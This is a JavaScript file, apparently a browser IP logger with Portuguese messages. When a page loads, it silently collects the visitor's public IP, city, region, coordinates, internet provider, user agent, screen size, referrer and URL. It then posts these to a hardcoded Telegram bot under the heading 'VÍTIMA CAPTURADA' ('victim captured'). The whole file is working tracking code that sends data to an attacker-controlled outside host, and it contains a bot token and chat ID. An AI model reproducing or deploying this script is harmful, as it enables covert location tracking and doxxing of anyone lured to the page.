const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
const CHAT_ID = "8551438856";

async function getPublicIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        return d.ip;
    } catch { return '❌ Falha ao obter IP'; }
}

async function getLocationByIP(ip) {
    try {
        const r = await fetch(`https://ipinfo.io/${ip}/json`);
        const d = await r.json();
        return {
            city: d.city || 'Desconhecida',
            region: d.region || 'Desconhecida',
            country: d.country || 'Desconhecido',
            loc: d.loc || 'Desconhecida',
            org: d.org || 'Desconhecido',
            timezone: d.timezone || 'Desconhecido'
        };
    } catch {
        return { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
    }
}

function getBrowserData() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direto',
        url: window.location.href,
        timestamp: new Date().toLocaleString('pt-BR')
    };
}

async function sendToTelegram(ip, location, browser) {
    let msg = `
🕵️‍♂️ **VÍTIMA CAPTURADA** 💀

🌐 **IP:** ${ip}
📍 **Cidade:** ${location.city}
📍 **Região:** ${location.region}
📍 **País:** ${location.country}
🗺️ **Coordenadas:** ${location.loc}
🕰️ **Fuso:** ${location.timezone}

📊 **Navegador:**
🖥️ ${browser.userAgent}
📐 Tela: ${browser.screen}
🌍 Idioma: ${browser.language}
🔗 Referer: ${browser.referrer}
📎 URL: ${browser.url}
⏱️ Hora: ${browser.timestamp}
    `;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        if (r.ok) {
            document.getElementById('status').textContent = '✅ Dados enviados!';
            document.getElementById('status').style.color = '#00ff41';
        } else {
            document.getElementById('status').textContent = '❌ Erro ao enviar!';
            document.getElementById('status').style.color = '#ff0000';
        }
    } catch {
        document.getElementById('status').textContent = '❌ Erro de rede!';
        document.getElementById('status').style.color = '#ff0000';
    }
}

async function main() {
    const status = document.getElementById('status');
    status.textContent = '📡 Coletando dados...';

    const ip = await getPublicIP();
    const location = await getLocationByIP(ip);
    const browser = getBrowserData();

    status.textContent = '📤 Enviando...';
    await sendToTelegram(ip, location, browser);
}

document.addEventListener('DOMContentLoaded', main);
